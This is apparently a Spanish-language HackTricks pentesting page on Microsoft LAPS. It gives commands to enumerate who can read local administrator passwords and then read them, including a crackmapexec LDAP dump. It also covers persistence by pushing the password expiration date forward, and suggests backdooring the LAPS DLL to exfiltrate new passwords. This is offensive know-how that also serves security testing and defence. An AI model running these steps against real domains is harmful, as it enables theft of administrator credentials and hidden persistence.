# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Información básica

**LAPS** te permite **administrar la contraseña del Administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en equipos unidos al dominio. Estas contraseñas se almacenan de forma centralizada en Active Directory y están restringidas a usuarios autorizados mediante ACL. Las contraseñas están protegidas en tránsito desde el cliente hasta el servidor mediante Kerberos v5 y AES.

Cuando se utiliza LAPS, aparecen **2 nuevos atributos** en los objetos **computadora** del dominio: **`ms-mcs-AdmPwd`** y **`ms-mcs-AdmPwdExpirationTime`**. Estos atributos contienen la **contraseña de administrador en texto plano y la hora de vencimiento**. Luego, en un entorno de dominio, podría ser interesante verificar **qué usuarios pueden leer** estos atributos.

### Verificar si está activado
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Acceso a contraseñas LAPS

Puede **descargar la directiva LAPS en bruto** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego utilizar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo en un formato legible para humanos.

Además, se pueden utilizar los **cmdlets nativos de PowerShell de LAPS** si están instalados en una máquina a la que tenemos acceso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** también se puede utilizar para averiguar **quién puede leer la contraseña y leerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

El [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones.\
Una de ellas es analizar los **`ExtendedRights`** para **todos los equipos con LAPS habilitado**. Esto mostrará los **grupos** específicamente **delegados para leer contraseñas de LAPS**, que a menudo son usuarios en grupos protegidos.\
Una **cuenta** que ha **unido un equipo** a un dominio recibe `Todos los Extended Rights` sobre ese host, y este derecho le otorga a la **cuenta** la capacidad de **leer contraseñas**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña de LAPS en un host. Esto nos puede ayudar a **apuntar a usuarios específicos de AD** que pueden leer contraseñas de LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Extrayendo contraseñas de LAPS con Crackmapexec**
Si no se tiene acceso a PowerShell, se puede abusar de este privilegio de forma remota a través de LDAP utilizando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Esto volcará todas las contraseñas que el usuario puede leer, permitiéndote obtener un mejor punto de apoyo con un usuario diferente.

## **Persistencia de LAPS**

### **Fecha de vencimiento**

Una vez que se es administrador, es posible **obtener las contraseñas** y **evitar** que una máquina **actualice** su **contraseña** al **establecer la fecha de vencimiento en el futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
La contraseña aún se restablecerá si un **administrador** utiliza el cmdlet **`Reset-AdmPwdPassword`**; o si está habilitada la opción **No permitir un tiempo de expiración de contraseña más largo de lo requerido por la directiva** en la directiva de LAPS.
{% endhint %}

### Puerta trasera

El código fuente original de LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto, es posible poner una puerta trasera en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`, por ejemplo) que de alguna manera **exfiltre nuevas contraseñas o las almacene en algún lugar**.

Luego, simplemente compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la hora de modificación).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
